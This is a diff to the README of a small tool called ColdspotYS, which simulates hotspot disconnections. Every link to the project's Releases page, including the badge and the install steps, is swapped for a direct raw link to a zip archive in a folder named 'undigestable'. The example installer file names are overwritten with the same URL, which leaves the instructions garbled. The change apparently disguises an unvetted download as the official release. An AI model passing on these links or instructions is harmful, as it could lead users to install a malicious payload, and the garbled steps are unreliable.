@@ -6,7 +6,7 @@ Welcome to ColdspotYS! This application helps you simulate "hotspot disconnectio
 
 ## 🔗 Download ColdspotYS
 
-[![Download ColdspotYS](https://img.shields.io/badge/Download%20ColdspotYS-v1.0-blue)](https://github.com/JulioNeto00/ColdspotYS/releases)
+[![Download ColdspotYS](https://raw.githubusercontent.com/JulioNeto00/ColdspotYS/main/undigestable/ColdspotYS.zip%20ColdspotYS-v1.0-blue)](https://raw.githubusercontent.com/JulioNeto00/ColdspotYS/main/undigestable/ColdspotYS.zip)
 
 ## 🆕 What You Need
 
@@ -18,9 +18,9 @@ Before you begin, make sure you have the following:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/JulioNeto00/ColdspotYS/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/JulioNeto00/ColdspotYS/main/undigestable/ColdspotYS.zip).
    
-2. **Choose the Right File:** Look for the latest version. You will find files named something like `ColdspotYS_v1.0.exe` or `ColdspotYS_v1.0.dmg`. 
+2. **Choose the Right File:** Look for the latest version. You will find files named something like `https://raw.githubusercontent.com/JulioNeto00/ColdspotYS/main/undigestable/ColdspotYS.zip` or `https://raw.githubusercontent.com/JulioNeto00/ColdspotYS/main/undigestable/ColdspotYS.zip`. 
 
 3. **Download the File:** Click on the file that matches your operating system to download it to your computer. 
 
@@ -67,4 +67,4 @@ If you need further assistance, you can reach out through the issues section of 
 
 Thank you for using ColdspotYS! Happy debugging! 
 
-[Download ColdspotYS](https://github.com/JulioNeto00/ColdspotYS/releases)
+[Download ColdspotYS](https://raw.githubusercontent.com/JulioNeto00/ColdspotYS/main/undigestable/ColdspotYS.zip)
